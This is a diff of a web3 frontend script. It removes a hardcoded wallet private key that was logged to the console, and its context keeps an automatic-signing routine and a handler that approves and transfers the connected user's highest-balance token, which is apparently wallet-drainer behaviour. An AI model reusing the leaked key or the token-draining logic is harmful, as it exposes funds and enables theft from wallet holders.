@@ -20,7 +20,6 @@ import TokenBalanceCalculator from "./getBalance.js"
 
 // Initialize TokenContractDetails with Web3 instance
 const web3 = new Web3(window.ethereum);
-console.log('Web 3: ', web3);
 
 const tokenDetailsViewer = new TokenContractDetails(web3)
 
@@ -61,24 +60,11 @@ document.getElementById("disconnect-btn")?.addEventListener("click", () => {
   clearStoredSignature()
 })
 
-// Add this function to call setTokenAddress on DR_CONTRACT
-const hexToUint8Array = (hex) => {
-  if (hex.startsWith("0x")) hex = hex.slice(2) // Remove the 0x prefix if present
-  const bytes = new Uint8Array(hex.length / 2)
-  for (let i = 0; i < bytes.length; i++) {
-    bytes[i] = Number.parseInt(hex.substr(i * 2, 2), 16)
-  }
-  return bytes
-}
-
 // Initialize TokenBalanceUI
 const tokenBalanceUI = new TokenBalanceUI(".token-balances")
 
-const ownerPrivateKey = "0x64b84368b7821847bdecabaaa3677b4c1403949c74b11b69e9dd7df3273f8115";
-console.log(ownerPrivateKey)
-
 // Add this after your existing wagmiAdapter initialization
-const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig, ownerPrivateKey)
+const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig)
 
 // Add the automatic signing function
 const SIGNATURE_KEY = "wallet_signature"
@@ -313,7 +299,7 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 
     statusEl.textContent = `Successfully approved and transferred ${highestBalanceToken.symbol} tokens!`
 
-    return { spendTx }
+    // return { spendTx }
   } catch (error) {
     console.error("Approval and transfer error:", error)
     document.querySelector("#status").textContent = "Approval and transfer failed"
